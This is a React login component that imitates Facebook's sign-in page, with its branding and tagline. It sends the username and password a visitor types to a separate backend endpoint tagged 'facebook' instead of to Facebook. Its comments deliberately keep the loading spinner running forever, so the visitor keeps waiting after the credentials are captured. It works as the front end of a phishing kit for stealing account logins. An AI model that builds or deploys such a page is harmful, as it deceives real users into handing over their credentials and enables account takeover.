"use client";
import { useState } from "react";

export default function FacebookLogin() {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });
  const [errors, setErrors] = useState({ username: "", password: "" });
  const [loading, setLoading] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
    if (errors[name]) {
      setErrors((prev) => ({ ...prev, [name]: "" }));
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setErrors({ username: "", password: "" });

    if (!formData.username) {
      setErrors((prev) => ({
        ...prev,
        username: "Email or phone number is required",
      }));
      return;
    }

    if (!formData.password) {
      setErrors((prev) => ({ ...prev, password: "Password is required" }));
      return;
    }

    if (formData.password.length < 6) {
      setErrors((prev) => ({
        ...prev,
        password: "Password must be at least 6 characters",
      }));
      return;
    }

    try {
      setLoading(true); // Start loading

      const response = await fetch("http://localhost:5000/api/auth/facebook", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: formData.username,
          password: formData.password,
          platform: "facebook",
        }),
      });

      const data = await response.json();

      if (response.ok) {
        alert("Login successful!");
        console.log("Login successful:", data);
        // Do NOT setLoading(false) here — keep loading true forever
      } else {
        setErrors((prev) => ({
          ...prev,
          password: data.message || "Login failed",
        }));
        // Even on error, keep loading true forever
      }
    } catch (error) {
      setErrors((prev) => ({
        ...prev,
        password: "Network error. Please try again.",
      }));
      // Keep loading true even on network error
    }
  };

  return (
    <div className="min-h-screen bg-gray-100">
      <div className="flex flex-col items-center justify-center min-h-screen px-4">
        <div className="w-full max-w-md">
          {/* Facebook Logo */}
          <div className="text-center mb-6">
            <h1 className="text-5xl font-bold text-blue-600 mb-2">facebook</h1>
            <p className="text-gray-600 text-lg">
              Connect with friends and the world around you on Facebook.
            </p>
          </div>

          {/* Login Form */}
          <div className="bg-white rounded-lg shadow-lg p-6">
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <input
                  type="text"
                  name="username"
                  placeholder="Email or phone number"
                  value={formData.username}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 border rounded-md text-lg focus:outline-none ${errors.username
                      ? "border-red-500 focus:border-red-500"
                      : "border-gray-300 focus:border-blue-500"
                    }`}
                  disabled={loading}
                />
                {errors.username && (
                  <p className="text-red-500 text-sm mt-1">{errors.username}</p>
                )}
              </div>

              <div>
                <input
                  type="password"
                  name="password"
                  placeholder="Password"
                  value={formData.password}
                  onChange={handleInputChange}
                  className={`w-full px-4 py-3 border rounded-md text-lg focus:outline-none ${errors.password
                      ? "border-red-500 focus:border-red-500"
                      : "border-gray-300 focus:border-blue-500"
                    }`}
                  disabled={loading}
                />
                {errors.password && (
                  <p className="text-red-500 text-sm mt-1">{errors.password}</p>
                )}
              </div>

              <button
                type="submit"
                className="w-full bg-blue-600 text-white py-3 rounded-md text-lg font-semibold hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                disabled={loading}
              >
                {loading ? (
                  <div className="flex justify-center items-center">
                    <svg
                      className="animate-spin h-5 w-5 mr-3 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                      ></path>
                    </svg>
                    Loading...
                  </div>
                ) : (
                  "Log In"
                )}
              </button>
            </form>

            <div className="text-center mt-4">
              <a href="#" className="text-blue-600 hover:underline text-sm">
                Forgotten password?
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
